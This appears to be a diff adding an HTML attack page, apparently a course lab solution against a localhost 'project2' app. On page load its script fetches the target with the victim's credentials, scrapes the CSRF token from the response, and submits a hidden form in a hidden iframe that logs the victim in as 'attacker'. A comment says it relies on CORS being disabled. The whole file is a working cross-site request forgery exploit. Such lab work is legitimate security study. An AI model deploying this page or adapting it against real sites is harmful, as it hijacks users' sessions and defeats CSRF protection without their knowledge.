@@ -1,0 +1,63 @@
+
+
+<script src="http://ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"> </script>
+
+<script>
+  //This only works if CORS is disabled. I used the CORS Everywhere extension on FireFox.
+  window.onload = function() {
+    fetch('http://localhost/project2?csrfdefense=1&xssdefense=4', {
+      method: 'GET',
+      credentials:'include'
+    }) 
+      .then(response => response.text())
+      .then(data => {
+        console.log(data);
+        
+        cookie_index = (data.indexOf("'csrf' value='"));        
+        csrf_cookie = (data.substring(cookie_index+14, cookie_index+46));
+        //alert(csrf_cookie);
+
+
+        var form = document.createElement('form');
+        form.setAttribute('target', 'hiddeniframe');
+        form.setAttribute('method', 'POST');
+        form.setAttribute('action', 'http://localhost/project2/login?csrfdefense=1&xssdefense=4');
+
+        var inputUsername = document.createElement('input');
+        inputUsername.type = 'hidden';
+        inputUsername.name = 'username';
+        inputUsername.value = 'attacker';
+
+        var inputPassword = document.createElement('input');
+        inputPassword.type = 'hidden';
+        inputPassword.name = 'password';
+        inputPassword.value = 'badguy4';
+
+        var inputCsrf = document.createElement('input');
+        inputCsrf.type = 'hidden';
+        inputCsrf.name = 'csrf';
+        inputCsrf.value = csrf_cookie;
+
+
+        form.appendChild(inputUsername);
+        form.appendChild(inputPassword);
+        form.appendChild(inputCsrf);
+
+        document.body.appendChild(form);
+
+        var iframe = document.createElement('iframe');
+
+        iframe.setAttribute('name', 'hiddeniframe');
+        
+        document.body.appendChild(iframe);
+        
+        form.submit();
+
+        $('iframe[name=hiddeniframe]').hide();
+
+
+        //document.getElementById("response").textContent = JSON.stringify(data);
+      })
+      .catch(error => console.error('Error:', error));
+  };
+</script>
